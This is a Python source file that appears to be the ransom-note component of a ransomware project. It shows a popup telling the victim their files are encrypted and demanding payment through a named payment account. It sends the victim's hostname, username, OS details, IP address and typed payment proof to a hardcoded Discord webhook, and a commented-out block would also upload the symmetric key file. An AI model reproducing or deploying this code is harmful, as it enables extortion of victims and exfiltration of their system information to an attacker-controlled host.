import json
import sys
from tkinter import *
import customtkinter
import platform
import socket
from datetime import datetime
import pathlib
import os
import requests

# to send user input information to discord
def send_key_to_discord(user_input):
    # Replace with your Discord webhook URL
    discord_webhook_url = 'https://discord.com/api/webhooks/1294175755109924924/70hDsYAisH9sGSYJnXa3wr26vUcj-3X4cfVpTjwPtNAJWJq7cqtVSzKZWDuh9zxLW20n'

    # Collect system information
    computer_name = platform.node()  # Hostname
    user_os = platform.system()  # Operating System (Windows, Linux, Darwin)
    os_version = platform.version()  # OS Version
    current_user = os.getlogin()  # Username of the logged-in user
    ip_address = socket.gethostbyname(socket.gethostname())  # Victim's IP Address
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")  # Current Timestamp

    # Open the symmetric_key.key file to attach
    # key_file_path = f'{pathlib.Path(sys.argv[0]).parent.absolute()}/symmetric_key.key'
    # files = {
    #     'file': ('symmetric_key.key', open(key_file_path, 'rb'))  # File part
    # }

    # Construct the payload with system info (JSON data for the system info)
    data = {
        "content": "Victim's proof of payment",
        "embeds": [{
            "title": "Encryption Details",
            "fields": [
                {"name": "Computer Name", "value": computer_name, "inline": True},
                {"name": "Operating System", "value": user_os, "inline": True},
                {"name": "OS Version", "value": os_version, "inline": True},
                {"name": "Current User", "value": current_user, "inline": True},
                {"name": "IP Address", "value": ip_address, "inline": True},
                {"name": "Timestamp", "value": timestamp, "inline": True},
                {"name": "User_response", "value": user_input, "inline": True}
            ]
        }]
    }

    # Send the data to the Discord webhook along with the file
    try:
        # Use 'payload_json' for the JSON part and 'files' for the file attachment
        response = requests.post(discord_webhook_url, data={'payload_json': json.dumps(data)})
        
        if response.status_code == 204 or response.status_code == 200:
            print("Symmetric key file and victim info sent to Discord successfully.")
        else:
            print(f"Failed to send information to Discord. Status code: {response.status_code}")
            print(f"Response text: {response.text}")  # Debug response from Discord
    except Exception as e:
        print(f"Error sending information to Discord: {e}")

customtkinter.set_appearance_mode("dark")
customtkinter.set_default_color_theme("dark-blue")

def popup_message():
    root = customtkinter.CTk()

    root.title('Ransom? Note ')
    # root.iconbitmap('images/codemy.ico')
    root.geometry('600x400')


    def input_window():
        # create a new toplevel window
        input_window = customtkinter.CTkToplevel(root)
        input_window.geometry("300x150")
        input_window.title("Hello Victim!")

        # create a label and an entry field
        input_label = customtkinter.CTkLabel(input_window, text="Input proof of payment ( ˶ˆᗜˆ˵ )")
        input_label.pack(pady=10)

        input_entry = customtkinter.CTkEntry(input_window)
        input_entry.pack(pady=10)

        def process_input():
            user_input = input_entry.get()
            if user_input:
                my_label.configure(text = f"Your input: \"{user_input}\" \n If everything is in order, you will hear from us soon")
                send_key_to_discord(user_input)
                my_button.destroy()
            else:
                my_label.configure(text=f"You have to input something")
            input_window.destroy()

        def close_window():
            input_window.destroy()

        # Create a frame to hold the buttons
        button_frame = customtkinter.CTkFrame(input_window)
        button_frame.pack(pady=10)

        # Create the Submit and Close buttons inside the frame, side by side
        submit_button = customtkinter.CTkButton(button_frame, text="Submit", command=process_input)
        submit_button.pack(side=LEFT, padx=5)

        close_button = customtkinter.CTkButton(button_frame, text="Close", command=close_window)
        close_button.pack(side=LEFT, padx=5)

    # create a label
    my_label = customtkinter.CTkLabel(root, text= 'All of your files are encrypted <^.^> \n Pay us the ransom if you want your files back \n Get yourself a Skred account and add this user 85ce8027-23f7-456d-883f-26abd40b4784')
    my_label.pack(pady = 2)

    # create a button
    my_button = customtkinter.CTkButton(root, text="Pay up!", command=input_window)
    my_button.pack(pady = 150)


    root.mainloop()

if __name__ == "__main__":
    popup_message()